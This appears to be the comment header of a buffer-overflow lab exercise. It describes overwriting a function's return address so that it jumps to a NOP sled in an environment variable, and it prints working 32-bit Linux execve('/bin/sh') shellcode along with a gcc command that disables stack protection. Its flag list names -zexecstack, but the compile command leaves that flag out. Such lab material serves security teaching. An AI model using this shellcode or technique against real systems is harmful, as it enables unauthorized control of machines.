/*
Target of this program is to over flow stack in such a way that return address
from foo function changed to some address in the above the stack (which store
the location of some address of nops of environment variable, which at the end
store the address of executable shellcode).

SHELLCODE : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

Assume ASLR is turned ON.

Compilation command:
gcc -m32 -g -fno-stack-protector exploit_me_4.c -o exploit_me_4

Arguments used:
	-m32: instrcuting the compiler to build 32 bit Binary.
	-g: This allow C code to visible in gdb.
	-fno-stack-protector: Disbale stack protection by canary.
    -zexecstack: stack is marked as executable.
